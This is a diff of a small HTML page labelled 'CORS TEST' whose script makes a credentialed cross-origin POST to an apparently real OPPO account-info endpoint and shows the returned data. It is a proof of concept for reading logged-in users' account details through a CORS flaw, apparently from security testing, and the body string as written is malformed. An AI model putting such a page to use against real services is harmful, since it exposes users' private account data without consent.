@@ -1,17 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CORS TEST</h2>
+<pre id="result">Waiting...</pre>
+
 <script>
-fetch("https://id-sg.oppo.com/uc/web/v1/user-info/security-info", {
+fetch("https://id-sg.oppo.com/uc/web/v1/user-info/query-basic", {
   method: "POST",
   credentials: "include",
   headers: {
     "Content-Type": "application/json"
   },
-  body: "{"LYeBujYQ6EeAnbdyh63CBfiw5XIRgyMBu21S9wTmLUJm/gGnQ4ZKNkew2RSfwloboL3T8eAEiuvwwPuj5BOe8ybuMDEGm7Tm1kVzyFTzxgULpaFcZhak+hWXpNoJiUWHHiMTt5NRezh+uYjr5WofSKS1jfvXCcbNhY0Si9HcB7k=.rmZFhNfNBTiGCrwIo/kFPlOSgKNXqO0Pvjz+JIbLRqCYStwML2xFV+SpJFtl4SKxzvm7IUYZF59YZlbIPLbl37F08SO4yQUOGN/CPPU2rRYiHKf0AwambGMtNq1GceFQGZy8ODxntXWkwc7+v5BC3pIgQB/L2zMzClvgJ9HA0bo=.cF8="}"
+  body: "{"aQsTzOdTPTrB9Q2gdLe9PsyYvPVbRatiQ2aL6CIFlwRIie3kahegkh7pD6qEbLi/iAr6R8NdU8xam4QN9g3P9/z1K9LI2yNLyxcHOaWnqh/P+rAOxLZ6kFdcmTQe41vWlsTj6gBCQ2+vuS/6kKD3+WVNrdy0y/cxs7OgDw8h8/M=.XeyJ3eXXZ8RZFskHvzaaSvYfznWNa3+k0HCupLoFKjf8mConzSDC4qzOJR9q9ZLicoizB8qNx3SiAWM4M2OpJduxUxxYYAKm6aU8r2zZT+o1xNUIGa+UaMobuyu/fJEKlKAG1NHlI+1klBgSeTt9b2mVHj0C7gtw4XJe6AucFdA=.Lvo="}"
 })
 .then(r => r.text())
 .then(data => {
   document.getElementById("result").innerText = data;
+  console.log("RESPONSE:", data);
 })
-.catch(e => {
-  document.getElementById("result").innerText = e;
+.catch(err => {
+  document.getElementById("result").innerText = err;
 });
 </script>
+</body>
+</html>
